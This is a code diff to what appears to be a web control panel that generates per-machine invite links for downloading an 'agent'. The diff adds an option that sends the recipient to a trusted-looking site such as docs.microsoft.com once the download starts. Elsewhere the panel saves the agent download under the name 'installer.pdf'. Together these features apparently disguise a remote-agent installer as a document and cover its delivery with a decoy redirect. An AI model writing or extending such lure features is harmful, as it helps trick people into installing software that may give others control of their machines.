@@ -1951,6 +1951,17 @@ Window context is shown in [brackets].
           <input class="finput" id="dev-server-url" placeholder="auto"/>
           <div class="fhint">Leave blank to use: <span id="srv-hint" style="font-family:var(--mono);color:var(--c-brand)">—</span></div>
         </div>
+        <div class="fg">
+          <label class="flbl">Link Behaviour</label>
+          <div style="display:flex;gap:8px;margin-bottom:6px">
+            <button type="button" id="mode-blank-btn" onclick="setLinkMode('blank')" style="flex:1;padding:8px;border-radius:6px;border:2px solid var(--c-brand);background:var(--c-brand);color:#000;font-size:11px;font-weight:700;cursor:pointer">⬛ Blank Page</button>
+            <button type="button" id="mode-redirect-btn" onclick="setLinkMode('redirect')" style="flex:1;padding:8px;border-radius:6px;border:2px solid var(--border);background:var(--bg-2);color:var(--text-2);font-size:11px;font-weight:700;cursor:pointer">↪ Redirect to Site</button>
+          </div>
+          <div id="redirect-url-wrap" style="display:none">
+            <input class="finput" id="dev-redirect-url" placeholder="https://docs.microsoft.com" autocomplete="off"/>
+            <div class="fhint">User will be sent here after download starts</div>
+          </div>
+        </div>
       </div>
       <div class="mfoot"><button class="btn btn-s" onclick="closeModal()">Cancel</button><button class="btn btn-p" onclick="generateLink()"><span class="mi">link</span>Build + Generate</button></div>
     </div>
@@ -2656,25 +2667,42 @@ function toggleAllCheck(cb) { document.querySelectorAll('#mtbody input[type=chec
 /* ══ Invite ══════════════════════════════════════════════════════ */
 function goStep(n) { document.querySelectorAll('.step-wrap').forEach(s=>s.classList.remove('active')); $(`step-${n}`)?.classList.add('active'); }
 function setConnStep(id,state) { const el=$(id); if(!el) return; el.className=`step-icon ${state}`; }
+let _linkMode = 'blank';
+function setLinkMode(mode) {
+  _linkMode = mode;
+  const blankBtn=$('mode-blank-btn'), redirBtn=$('mode-redirect-btn'), wrap=$('redirect-url-wrap');
+  if(mode==='blank'){
+    if(blankBtn){blankBtn.style.border='2px solid var(--c-brand)';blankBtn.style.background='var(--c-brand)';blankBtn.style.color='#000';}
+    if(redirBtn){redirBtn.style.border='2px solid var(--border)';redirBtn.style.background='var(--bg-2)';redirBtn.style.color='var(--text-2)';}
+    if(wrap)wrap.style.display='none';
+  } else {
+    if(redirBtn){redirBtn.style.border='2px solid var(--c-brand)';redirBtn.style.background='var(--c-brand)';redirBtn.style.color='#000';}
+    if(blankBtn){blankBtn.style.border='2px solid var(--border)';blankBtn.style.background='var(--bg-2)';blankBtn.style.color='var(--text-2)';}
+    if(wrap)wrap.style.display='';
+  }
+}
 async function generateLink() {
   const label = $('dev-label')?.value?.trim()||'';
   if (!label) { showToast('Machine label is required','error'); return; }
   const loc=$('dev-location')?.value?.trim()||'', type=$('dev-type')?.value||'Standard Display', expiry=parseInt($('dev-expiry')?.value||'86400');
   const srv=($('dev-server-url')?.value?.trim()||SC.SERVER_URL).replace(/\/+$/,'');
+  const linkMode = _linkMode || 'blank';
+  const redirectUrl = ($('dev-redirect-url')?.value?.trim()) || '';
+  if(linkMode==='redirect' && !redirectUrl){ showToast('Please enter a redirect URL','error'); return; }
   goStep(2); ['cstep-1','cstep-2','cstep-3'].forEach(id=>setConnStep(id,'wait')); setConnStep('cstep-1','active');
   const setTxt=(t,s) => { const te=$('gen-status-title'),se=$('gen-status'); if(te)te.textContent=t; if(se)se.textContent=s; };
   try {
     let token=null, downloadUrl=null;
     setTxt('Contacting server…',`POST ${srv}/api/invite`);
     try {
-      const r=await fetch(`${srv}/api/invite`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label,location:loc,device_type:type,expiry}),signal:AbortSignal.timeout(7000)});
+      const r=await fetch(`${srv}/api/invite`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label,location:loc,device_type:type,expiry,link_mode:linkMode,redirect_url:redirectUrl}),signal:AbortSignal.timeout(7000)});
       if(r.ok) { const d=await r.json(); token=d.token||d.device_id; downloadUrl=d.download_url||d.agent_url||`${srv}/guide/${token}`; }
     } catch(e) { console.warn('[invite]',e.message); }
     if (!token) {
       const hex=()=>[...Array(3)].map(()=>Math.floor(Math.random()*256).toString(16).padStart(2,'0')).join('').toUpperCase();
       token=`MV-${hex()}-${hex()}-${hex()}`; downloadUrl=`${srv}/guide/${token}`;
       setTxt('Server offline — local fallback','Saving to Supabase…');
-      try { await SB.post(SC.activeTable||'devices',{device_id:token,label,location:loc,device_type:type,status:'pending',created_at:new Date().toISOString()}); } catch {}
+      try { await SB.post(SC.activeTable||'devices',{device_id:token,label,location:loc,device_type:type,status:'pending',link_mode:linkMode,redirect_url:redirectUrl,created_at:new Date().toISOString()}); } catch {}
     }
     setConnStep('cstep-1','done'); setConnStep('cstep-2','active'); setTxt('Session saved','Token registered');
     await new Promise(r=>setTimeout(r,350)); setConnStep('cstep-2','done'); setConnStep('cstep-3','active'); setTxt('Building link…',`${srv}/guide/${token}`);
@@ -2689,7 +2717,7 @@ async function generateLink() {
 }
 function handleDownload(e) { e.preventDefault(); const btn=$('dl-btn'); const url=btn?.dataset?.downloadUrl||btn?.href; if(url&&url!=='#'){const a=document.createElement('a');a.href=url;a.download='installer.pdf';document.body.appendChild(a);a.click();document.body.removeChild(a);showToast('Download started…','info');} }
 function copyLink() { const i=$('link-input'); if(!i) return; i.select(); try{document.execCommand('copy');}catch{navigator.clipboard?.writeText(i.value);} const ico=$('copy-ico'); if(ico){ico.textContent='check';setTimeout(()=>ico.textContent='content_copy',2000);} showToast('Link copied!','success'); }
-function resetModal() { if(_pollTimer)clearInterval(_pollTimer); goStep(1); ['dev-label','dev-location','dev-server-url'].forEach(id=>{const e=$(id);if(e)e.value='';}); }
+function resetModal() { if(_pollTimer)clearInterval(_pollTimer); goStep(1); ['dev-label','dev-location','dev-server-url','dev-redirect-url'].forEach(id=>{const e=$(id);if(e)e.value='';}); setLinkMode('blank'); }
 function startPoll(token) {
   if(_pollTimer)clearInterval(_pollTimer);
   let att=0; const pollTitle=$('poll-title'),pollTxt=$('poll-txt'),pdot=$('pdot');
